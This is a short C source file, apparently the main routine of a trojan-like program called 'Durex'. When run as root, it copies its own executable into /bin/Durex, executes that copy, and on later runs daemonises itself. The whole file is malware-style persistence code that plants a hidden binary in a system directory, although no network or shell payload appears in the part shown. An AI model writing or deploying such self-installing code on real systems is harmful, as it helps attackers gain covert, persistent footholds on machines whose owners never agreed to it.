#include <durex.h>

uint8_t		copy_in_bin(char *fname)
{
	int		fd_in;
	int		fd_out;
	char	buffer[BUF_SIZE];
	int		r;

	fd_in = open(fname, O_RDONLY);
	fd_out = open("/bin/Durex", O_WRONLY | O_CREAT, 0700);
	if (fd_in == -1 || fd_out == -1)
		return (0);
	while ((r = read(fd_in, buffer, BUF_SIZE)) > 0)
	{
		write(fd_out, buffer, r);
	}
	close(fd_out);	
	close(fd_in);
	return (1);
}

int		main(int ac, char **argv)
{
	(void)ac;
	if (getuid() != 0)
		return (0);
	if (access("/bin/Durex", F_OK))
	{
		printf(LOGIN);
		if (copy_in_bin(argv[0]))
			execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
	}
	else
	{
		printf("Running Durex in /bin\n");
		printf("%s\n", durex_service);
		daemon(0, 1);
		sleep(1000);
	}
	return (0);
}
